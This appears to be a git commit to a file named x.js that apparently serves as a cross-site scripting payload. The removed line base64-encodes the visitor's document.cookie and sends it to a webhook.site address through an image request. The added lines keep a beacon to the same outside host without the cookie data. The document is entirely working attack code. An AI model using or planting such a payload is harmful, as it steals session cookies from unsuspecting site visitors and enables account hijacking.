ce0f0e613075043b3d2d5063adc537dca6741bcd
T00mm <3200970+T00mm@users.noreply.github.com>
2024-12-11 14:14:44 +0100

    Update x.js

--- x.js
+++ x.js
@@ -1,1 +1,2 @@
-x = new Image(); x.src = 'https://webhook.site/2a8e6fb4-33ac-4efa-96f0-937395817b97?data='+btoa(document.cookie);
+x = new Image(); 
+x.src = 'https://webhook.site/2a8e6fb4-33ac-4efa-96f0-937395817b97/test';
